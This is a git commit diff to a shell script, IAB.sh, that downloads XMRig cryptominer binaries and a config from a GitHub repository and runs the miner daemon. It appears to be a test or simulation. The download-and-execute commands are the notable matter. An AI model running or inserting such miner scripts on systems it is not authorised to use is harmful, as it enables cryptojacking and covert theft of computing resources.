f5624f7bc650e862bae58c40248cdd8481fa4a18
jeffthorne <jthorne@u.washington.edu>
2021-03-10 07:27:47 -0800

    test

--- IAB.sh
+++ IAB.sh
@@ -4,6 +4,6 @@ wget https://github.com/jeffthorne/test/raw/main/xmrigDaemon -O xmrigDaemon
 chmod +x xmrigDaemon
 wget https://github.com/jeffthorne/test/raw/main/xmrigMiner -O xmrigMiner
 chmod +x /tmp/xmrigMiner
-wget https://raw.githubusercontent.com/jeffthorne/test/main/config.json
+wget https://raw.githubusercontent.com/jeffthorne/test/main/config.json -O config.json
 ./xmrigDaemon --config config.json
 
